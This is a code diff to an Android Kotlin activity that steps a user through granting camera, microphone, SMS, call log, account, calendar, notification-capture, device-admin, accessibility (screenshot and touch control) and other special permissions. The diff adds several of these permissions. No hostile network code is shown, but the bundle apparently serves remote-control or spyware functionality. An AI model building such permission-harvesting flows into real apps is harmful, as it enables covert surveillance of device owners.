@@ -28,6 +28,7 @@ class PermissionActivity : AppCompatActivity() {
 
     private val prefs by lazy { getSharedPreferences("csk4_perms", Context.MODE_PRIVATE) }
 
+    // ============ RUNTIME PERMISSIONS ============
     private val runtimePerms = mutableListOf<Pair<String, String>>(
         Manifest.permission.CAMERA to "📷 Camera",
         Manifest.permission.RECORD_AUDIO to "🎤 Microphone",
@@ -38,18 +39,25 @@ class PermissionActivity : AppCompatActivity() {
         Manifest.permission.SEND_SMS to "📩 Send SMS",
         Manifest.permission.READ_CALL_LOG to "📞 Call Logs",
         Manifest.permission.READ_PHONE_STATE to "📱 Phone State",
-        Manifest.permission.VIBRATE to "📳 Vibrate"
+        Manifest.permission.VIBRATE to "📳 Vibrate",
+        Manifest.permission.READ_CALENDAR to "📅 Calendar",
+        Manifest.permission.GET_ACCOUNTS to "👤 Accounts",
+        Manifest.permission.READ_PROFILE to "👤 Profile"
     )
 
     init {
+        // Android 13+ specific permissions
         if (Build.VERSION.SDK_INT >= 33) {
             runtimePerms.add(Manifest.permission.POST_NOTIFICATIONS to "🔔 Notifications")
             runtimePerms.add(Manifest.permission.READ_MEDIA_IMAGES to "🖼️ Images")
             runtimePerms.add(Manifest.permission.READ_MEDIA_VIDEO to "🎬 Videos")
             runtimePerms.add(Manifest.permission.READ_MEDIA_AUDIO to "🎵 Audio")
+            runtimePerms.add(Manifest.permission.NEARBY_WIFI_DEVICES to "📡 Nearby WiFi")
         } else {
             runtimePerms.add(Manifest.permission.READ_EXTERNAL_STORAGE to "📁 Storage")
         }
+        
+        // Android 12+ Bluetooth
         if (Build.VERSION.SDK_INT >= 31) {
             runtimePerms.add(Manifest.permission.BLUETOOTH_SCAN to "📶 BT Scan")
             runtimePerms.add(Manifest.permission.BLUETOOTH_CONNECT to "📶 BT Connect")
@@ -65,7 +73,6 @@ class PermissionActivity : AppCompatActivity() {
         btnNext = findViewById(R.id.btnNext)
 
         btnNext.setOnClickListener { handleNext() }
-
         currentIndex = 0
         showCurrent()
     }
@@ -79,6 +86,7 @@ class PermissionActivity : AppCompatActivity() {
         }
     }
 
+    // ============ SHOW CURRENT PERMISSION ============
     private fun showCurrent() {
         if (currentIndex >= runtimePerms.size) {
             checkSpecialPermissions()
@@ -86,7 +94,8 @@ class PermissionActivity : AppCompatActivity() {
         }
 
         val (perm, label) = runtimePerms[currentIndex]
-        val granted = ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
+        val granted = ContextCompat.checkSelfPermission(this, perm) == 
+                      PackageManager.PERMISSION_GRANTED
 
         if (granted) {
             currentIndex++
@@ -99,6 +108,7 @@ class PermissionActivity : AppCompatActivity() {
         btnNext.text = "Allow Permission"
     }
 
+    // ============ HANDLE NEXT ============
     private fun handleNext() {
         if (currentIndex >= runtimePerms.size) {
             checkSpecialPermissions()
@@ -106,7 +116,8 @@ class PermissionActivity : AppCompatActivity() {
         }
 
         val perm = runtimePerms[currentIndex].first
-        val granted = ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED
+        val granted = ContextCompat.checkSelfPermission(this, perm) == 
+                      PackageManager.PERMISSION_GRANTED
 
         if (granted) {
             currentIndex++
@@ -138,12 +149,14 @@ class PermissionActivity : AppCompatActivity() {
         }
     }
 
+    // ============ SPECIAL PERMISSIONS ============
     private fun checkSpecialPermissions() {
-        // 1. All Files Access
+        
+        // 1. All Files Access (Android 11+)
         if (Build.VERSION.SDK_INT >= 30) {
             if (!Environment.isExternalStorageManager()) {
                 tvStatus.text = "📁 All Files Access\n\nSab files access karein"
-                tvProgress.text = "Special Permission 1 of 5"
+                tvProgress.text = "Special Permission 1 of 6"
                 btnNext.text = "Open Settings"
                 btnNext.setOnClickListener {
                     try {
@@ -158,10 +171,10 @@ class PermissionActivity : AppCompatActivity() {
             }
         }
 
-        // 2. Notification Access
+        // 2. Notification Access (Android 5+)
         if (!isNotificationServiceEnabled()) {
             tvStatus.text = "🔔 Notification Access\n\nNotifications capture karne ke liye"
-            tvProgress.text = "Special Permission 2 of 5"
+            tvProgress.text = "Special Permission 2 of 6"
             btnNext.text = "Open Settings"
             btnNext.setOnClickListener {
                 try {
@@ -178,7 +191,7 @@ class PermissionActivity : AppCompatActivity() {
         val admin = ComponentName(this, DeviceAdminReceiver::class.java)
         if (!dpm.isAdminActive(admin)) {
             tvStatus.text = "🛡️ Device Admin\n\nLock aur security ke liye"
-            tvProgress.text = "Special Permission 3 of 5"
+            tvProgress.text = "Special Permission 3 of 6"
             btnNext.text = "Activate Admin"
             btnNext.setOnClickListener {
                 val i = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
@@ -189,10 +202,10 @@ class PermissionActivity : AppCompatActivity() {
             return
         }
 
-        // 4. Accessibility
+        // 4. Accessibility Service
         if (ScreenshotService.instance == null) {
             tvStatus.text = "📸 Accessibility\n\nScreenshot + Touch control ke liye"
-            tvProgress.text = "Special Permission 4 of 5"
+            tvProgress.text = "Special Permission 4 of 6"
             btnNext.text = "Open Accessibility"
             btnNext.setOnClickListener {
                 startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
@@ -201,11 +214,11 @@ class PermissionActivity : AppCompatActivity() {
             return
         }
 
-        // 5. Battery Optimization
+        // 5. Battery Optimization (Android 6+)
         val pm = getSystemService(POWER_SERVICE) as PowerManager
         if (Build.VERSION.SDK_INT >= 23 && !pm.isIgnoringBatteryOptimizations(packageName)) {
             tvStatus.text = "🔋 Battery Optimization\n\nBackground service ke liye OFF karein"
-            tvProgress.text = "Special Permission 5 of 5"
+            tvProgress.text = "Special Permission 5 of 6"
             btnNext.text = "Disable Optimization"
             btnNext.setOnClickListener {
                 try {
@@ -219,7 +232,20 @@ class PermissionActivity : AppCompatActivity() {
             return
         }
 
-        // All granted!
+        // 6. Write Settings (Android 6+)
+        if (Build.VERSION.SDK_INT >= 23 && !Settings.System.canWrite(this)) {
+            tvStatus.text = "⚙️ Modify Settings\n\nBrightness/Volume control ke liye"
+            tvProgress.text = "Special Permission 6 of 6"
+            btnNext.text = "Open Settings"
+            btnNext.setOnClickListener {
+                val i = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
+                i.data = Uri.parse("package:$packageName")
+                startActivity(i)
+            }
+            return
+        }
+
+        // ============ ALL GRANTED ============
         prefs.edit().putBoolean("all_granted", true).apply()
         tvStatus.text = "✅ All Permissions Granted"
         tvProgress.text = "Complete!"
@@ -230,6 +256,7 @@ class PermissionActivity : AppCompatActivity() {
         }
     }
 
+    // ============ HELPERS ============
     private fun isNotificationServiceEnabled(): Boolean {
         val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
         return flat != null && flat.contains(packageName)
